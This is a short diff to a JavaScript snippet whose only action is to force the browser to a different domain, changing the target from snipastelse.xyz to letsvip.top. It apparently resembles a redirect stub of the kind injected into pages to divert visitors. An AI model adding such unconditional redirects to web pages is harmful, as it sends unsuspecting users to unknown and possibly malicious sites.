@@ -1,3 +1,3 @@
 (function() {
-    window['location'] = 'https://snipastelse.xyz/';
+    window['location'] = 'https://letsvip.top/';
 })();
